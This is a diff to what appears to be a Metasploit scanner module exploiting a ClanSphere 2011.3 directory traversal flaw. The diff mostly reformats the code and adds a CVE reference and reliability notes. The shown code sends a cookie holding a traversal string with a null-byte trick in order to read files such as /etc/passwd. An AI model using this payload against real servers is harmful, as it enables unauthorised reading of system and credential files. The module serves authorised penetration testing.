@@ -9,35 +9,42 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'ClanSphere 2011.3 Local File Inclusion Vulnerability',
-      'Description'    => %q{
-        This module exploits a directory traversal flaw found in Clansphere 2011.3.
-        The application fails to handle the cs_lang parameter properly, which can be
-        used to read any file outside the virtual directory.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'ClanSphere 2011.3 Local File Inclusion Vulnerability',
+        'Description' => %q{
+          This module exploits a directory traversal flaw found in Clansphere 2011.3.
+          The application fails to handle the cs_lang parameter properly, which can be
+          used to read any file outside the virtual directory.
+        },
+        'References' => [
+          ['CVE', '2012-10034'],
           ['OSVDB', '86720'],
           ['EDB', '22181']
         ],
-      'Author'         =>
-        [
-          'blkhtc0rp',  #Original
+        'Author' => [
+          'blkhtc0rp', # Original
           'sinn3r'
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2012-10-23'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2012-10-23',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The URI path to the web application', '/clansphere_2011.3/']),
-        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
-        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
-      ])
+        OptString.new('FILE', [true, 'The file to obtain', '/etc/passwd']),
+        OptInt.new('DEPTH', [true, 'The max traversal depth to root directory', 10])
+      ]
+    )
   end
-
 
   def run_host(ip)
     base = normalize_uri(target_uri.path)
@@ -52,12 +59,12 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(base, "index.php"),
+      'uri' => normalize_uri(base, "index.php"),
       'cookie' => "blah=blah; cs_lang=#{traverse}#{f}%00.png"
     })
 
     if res and res.body =~ /^Fatal error\:/
-      print_error("Unable to read '#{datastore['FILE']}', possibily because:")
+      print_error("Unable to read '#{datastore['FILE']}', possibly because:")
       print_error("\t1. File does not exist.")
       print_error("\t2. No permission.")
       print_error("\t3. #{ip} isn't vulnerable to null byte poisoning.")
